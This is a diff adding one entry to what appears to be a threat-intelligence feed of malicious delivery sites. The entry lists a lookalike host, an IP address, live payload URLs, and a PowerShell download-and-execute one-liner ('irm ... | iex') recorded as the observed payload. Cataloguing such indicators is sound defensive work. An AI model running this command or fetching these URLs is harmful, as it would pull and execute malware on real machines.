@@ -956,5 +956,24 @@
     ],
     "ReportId": "cmwi2ffgu0wgc0omlvztx57aj",
     "ScannedAt": "2026-11-15T16:45:14.945000+00:00"
+  },
+  {
+    "UrlDomain": "qualitycleaningnj.com",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/wp/e9e0a4eb0e5a4b04"
+    ],
+    "IP": [
+      "50.87.234.5"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/wp/e9e0a4eb0e5a4b04"
+    ],
+    "ReportId": "cmwi3te6h0xgl0omlrat1pbrc",
+    "ScannedAt": "2026-11-15T17:24:06.080000+00:00"
   }
 ]
